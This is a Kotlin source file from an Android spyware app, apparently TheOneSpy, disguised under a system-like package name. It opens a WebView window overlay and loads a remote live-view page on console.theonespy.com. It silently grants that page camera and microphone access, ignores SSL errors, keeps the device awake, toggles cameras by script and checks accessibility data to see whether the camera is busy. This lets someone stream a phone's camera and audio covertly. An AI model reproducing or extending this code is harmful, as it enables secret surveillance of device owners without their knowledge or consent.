package com.android.services.workers.View360ByJitsi

import android.Manifest
import android.annotation.SuppressLint
import android.app.ActionBar
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.net.http.SslError
import android.os.Handler
import android.os.PowerManager
import android.view.Gravity
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.PermissionRequest
import android.webkit.SslErrorHandler
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.LinearLayout
import androidx.core.content.ContextCompat
import androidx.lifecycle.LiveData
import androidx.work.Data
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.View360ByJitsiCommand
import com.android.services.services.view360ByJitsi.View360ByJitsiCommandProcessingBaseI
import com.android.services.services.view360ByJitsi.View360ByJitsiMeetCommandService
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.android.services.workers.FutureWorkUtil
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope

class View360ByJitsiCommandProcessingBaseImpll(
    val context: Context,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : View360ByJitsiCommandProcessingBase(context) {

    private var isServiceInForeground = false
    private var view360ByJitsiCommand: View360ByJitsiCommand? = null
    private var audioType = "Unmuted"
    private var cameraType = "Front"
    private var homeToken = ""
    private var roomName = ""
   // private val switchCameraLiveData: LiveData<Boolean> get() = AppConstants.switchView360JitsiCameraObserver

    /**
     * Initialize the Window [WindowManager] by adding a WebView to the Window
     * Setup the webView with Credentials, and loads the view360 Url in WebView
     */
    override fun initialize() {
        logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} In OnCreate")
    }

    private fun addWebViewToWindow() {
        mWindowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val layoutParams = WindowManager.LayoutParams(
            ActionBar.LayoutParams.MATCH_PARENT, 1000,
            windowManagerFlagOverlay,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        layoutParams.gravity = Gravity.START or Gravity.TOP
        mWebView = WebView(applicationContext)
        mWebView!!.layoutParams = LinearLayout.LayoutParams(
            ActionBar.LayoutParams.MATCH_PARENT, 1000
        )
        mWindowManager!!.addView(mWebView, layoutParams)
        logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} WebView Attached to Window ")
    }

    override fun parseIntent(data: Data?) {
        try {
            ContextCompat.getMainExecutor(context).execute {
                logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} In Initialize() -> Ready to attach WebView to Window")
                acquireWakeLock()
                addWebViewToWindow()
                setUpWebViewDefaultSettings(mWebView!!)
                data?.let {
                    val view360ByJitsiCommandJsonString = data.getString(VIEW_360_BY_Jitsi_PUSH)
                    view360ByJitsiBugStatus=FcmPushStatus.INITIALIZED.getStatus()
                    view360ByJitsiCommandJsonString?.let {
                        view360ByJitsiCommand =
                            Gson().fromJson(it, View360ByJitsiCommand::class.java)
                        view360ByJitsiCommand?.let {
                            cameraType = it.cameraType
                            audioType = it.audioType
                            homeToken = it.homeToken
                            roomName = it.roomName
                        }
                        setWebViewConfiguration()
                        logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} view360Command = $view360ByJitsiCommand")
                    }
                }
            }
        }catch (exp: Exception) {
            logException(
                "${View360ByJitsiCommandProcessingBaseI.TAG} Initialize() Error: ${exp.message}",
                View360ByJitsiCommandProcessingBaseI.TAG, exp
            )
            stopThisService()
        }
    }

    private fun setWebViewConfiguration() {

        // Setup WebView Client
        mWebView!!.webViewClient = mWebViewClient

        // SetUp WebChrome Client
        mWebView!!.webChromeClient = mWebChromeClient
        mWebView!!.resumeTimers()
        val url =
            "https://console.theonespy.com/voip360/jitsiworkmanagerinit?psid=${roomName}&webToken=${homeToken}"
        mWebView!!.loadUrl(url)
        logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} Loading Url in webview")
        View360ByJitsiCommandProcessingBaseI.view360ByJitsiBugStatus =
            FcmPushStatus.INITIALIZED.getStatus()

    }

    /** Web Chrome Client **/
    private val mWebChromeClient = object : WebChromeClient() {
        override fun onPermissionRequest(request: PermissionRequest) {
            mHandler.post {
                request.grant(request.resources)
                logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} Permission Granted")
            }
        }
    }
    private fun informWaitDashboardToReconnect(webView: WebView?,) {
        if (webView != null) {
            webView.loadUrl("javascript:sendMessage(\"\",\"1\",\"1\")")
            logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} change Stream Called")
        } else {
            logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} change Stream Called but webview is nulll")
        }
    }
    var mRunnable = Runnable {
        clickOnToogleCameraButton(mWebView)
        startAgain()
    }

    fun startAgain() {
        Handler().postDelayed(
            mRunnable, 30000
        )
    }

    /** Web View Client **/
    private val mWebViewClient = object : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView,
            urlNewString: String,
        ): Boolean {
            if (!loadingFinished) {
                redirect = true
            }
            loadingFinished = false
            return true
        }

        override fun onReceivedError(
            view: WebView,
            request: WebResourceRequest,
            error: WebResourceError,
        ) {
            super.onReceivedError(view, request, error)
        }

        override fun onReceivedSslError(
            view: WebView,
            handler: SslErrorHandler,
            error: SslError,
        ) {
            handler.proceed()
        }

        override fun onPageStarted(view: WebView, url: String, facIcon: Bitmap?) {
            loadingFinished = false
        }

        @SuppressLint("JavascriptInterface")
        override fun onPageFinished(view: WebView, url: String) {
            if (!redirect) {
                loadingFinished = true
            }
            if (loadingFinished && !redirect) {
                try {
                    Handler().postDelayed(Runnable {
                        if (cameraType == "Back") {
                            clickOnToogleCameraButton(mWebView)
                        }
                        if (audioType == "Muted") {
                            clickOnToogleAudioButton(mWebView)
                        }
                    }, 1000)
                    logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} Page loaded")
                    Handler().postDelayed(Runnable {
                        checkPermissionAndSendCallBack()
                    }, 5000)
                } catch (e: Exception) {
                    logException(
                        "onPage Finished exception  ${e.message}",
                        View360ByJitsiCommandProcessingBaseI.TAG, e
                    )
                    stopThisService()
                }
            } else {
                redirect = false
            }
        }
    }

    /*
    *This Method check required permission and pass error message if any occur
     */
    private fun checkPermissionAndSendCallBack(message: String = "") {
        val errorMessage = message.ifEmpty { getErrorMessage() }
        if (errorMessage.isNotEmpty()) {
            if (mWebView != null) {
                logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} Error Message = $errorMessage")
                mWebView!!.loadUrl("javascript:sendMessage(\"$errorMessage\",\"0\")")
                logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} Error Message Function Called")
            } else {
                logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} Error Message Function Called but web view is null")
            }
        }
    }

    private fun clickOnToogleCameraButton(webView: WebView?) {
        if (webView != null) {
            webView.loadUrl("javascript:document.getElementById('toggleCamera').click()");
            logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} Clicked on Camera Button")
        } else {
            logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} WebView is null")
        }

    }

    private fun clickOnToogleAudioButton(webView: WebView?) {
        if (webView != null) {
            webView.loadUrl("javascript:document.getElementById('toggleAudio').click()");
            logVerbose("View360ByJitsiLogs: Clicked on Audio Button")
        } else {
            logVerbose("View360ByJitsiLogs: WebView is null")
        }

    }

    /** Check All Required Permission and Resources and return exception message **/
    private fun getErrorMessage(): String {
        try {
            val isMicrophonePermission = AppUtils.checkPermissionGranted(
                applicationContext,
                Manifest.permission.RECORD_AUDIO
            )
            var topPackage = ""
            topPackage = AccessibilityUtils.lastWindowPackage
            return if (!isMicrophonePermission) {
                "Microphone permission is missing. Kindly, grant permission and try again."
            } else if (AppUtils.isAccessibilityEnabled(applicationContext) && topPackage == AppUtils.getDefaultCamera()) {
                "Camera is working with an app, try it late"
            } else {
                ""
            }
        } catch (e: Exception) {
            return "${View360ByJitsiCommandProcessingBaseI.TAG} Exception while checking view360 permissions e=$e"
        }
    }

    /** Destroy the WebView and release it's resources **/
    private fun destroyWebView() {
       ContextCompat.getMainExecutor(context).execute {
           // Make sure you remove the WebView from its parent view before doing anything.
           mWebView!!.removeAllViews()
           mWebView!!.clearHistory()

           // NOTE: clears RAM cache, if you pass true, it will also clear the disk cache.
           // Probably not a great idea to pass true if you have oter WebViews still alive.
           mWebView!!.clearCache(true)

           // Loading a blank page is optional, but will ensure that the WebView isn't doing anything when you destroy it.
           mWebView!!.loadUrl("about:blank");
           mWebView!!.onPause()
           mWebView!!.removeAllViews()
           mWebView!!.destroyDrawingCache()

           // NOTE: This pauses JavaScript execution for ALL WebViews,
           // do not use if you have other WebViews still alive.
           // If you create another WebView after calling this,
           // make sure to call mWebView.resumeTimers().
           mWebView!!.pauseTimers()
           // NOTE: This can occasionally cause a segfault below API 17 (4.2)
           mWebView!!.destroy()
           // Null out the reference so that you don't end up re-using it.
           mWebView = null
           logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} WebView destroyed")
       }
    }

    /**
     * Set WebView Defaults
     * @param webView Instance of Web View
     */
    private fun setUpWebViewDefaultSettings(webView: WebView) {
        val settings = webView.settings
        try {
            // Enable Javascript
            settings.javaScriptEnabled = true
            settings.setAppCacheEnabled(false)
            settings.cacheMode = WebSettings.LOAD_NO_CACHE
            settings.allowFileAccessFromFileURLs = true
            settings.mediaPlaybackRequiresUserGesture = false
            settings.allowFileAccessFromFileURLs = true
            settings.allowUniversalAccessFromFileURLs = true
            // Use WideViewport and Zoom out if there is no viewport defined
            settings.useWideViewPort = true
            settings.loadWithOverviewMode = true
            // Enable pinch to zoom without the zoom buttons
            settings.builtInZoomControls = true
            // Allow use of Local Storage
            settings.domStorageEnabled = true
            // Hide the zoom controls for HONEYCOMB+
            settings.displayZoomControls = false
            // Enable remote debugging via chrome://inspect
            if (AppConstants.osGreaterThanOrEqualLollipop) {
                WebView.setWebContentsDebuggingEnabled(
                    true
                )
                // AppRTC requires third party cookies to work
                val cookieManager = CookieManager.getInstance()
                cookieManager.setAcceptThirdPartyCookies(mWebView, true)
            }
        } catch (e: Exception) {
            logException("${View360ByJitsiCommandProcessingBaseI.TAG} ${AppUtils.currentMethod} exception = ${e.message}")
        }
    }

    override fun onServiceDestroy() {
        logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} In OnDestroy -> Releasing Resources")
        try {
            if(view360ByJitsiBugStatus==FcmPushStatus.INITIALIZED.getStatus()){
                logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} In OnDestroy -> Informed to reconnect")
                informWaitDashboardToReconnect(mWebView)
            }
            if (mWebView != null && mWebView!!.parent != null) {
//                    mWindowManager!!.removeViewImmediate(mWebView)
                if (AppConstants.view360InteruptMessage.isNotEmpty()) {
                    checkPermissionAndSendCallBack(AppConstants.view360InteruptMessage)
                }
                mWindowManager!!.removeView(mWebView)
                destroyWebView()
            }
            logVerbose("${View360ByJitsiCommandProcessingBaseI.TAG} Service is getting stop")
            AppConstants.view360InteruptMessage = ""
            releaseWakeLock()
        } catch (exp: Exception) {
            logException("${View360ByJitsiCommandProcessingBaseI.TAG} onDestroy Exception = ${exp.message}")
            stopThisService()
        }
    }

    private fun stopThisService() {
        FutureWorkUtil.stopBackgroundWorker(context, VIEW_360_BY_JITSI_WORKER_TAG)
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        val pm = context.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            View360ByJitsiCommandProcessingBaseI.TAG_VIEW_360_BUG_WORK
        )
        wakeLock!!.acquire()
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }
}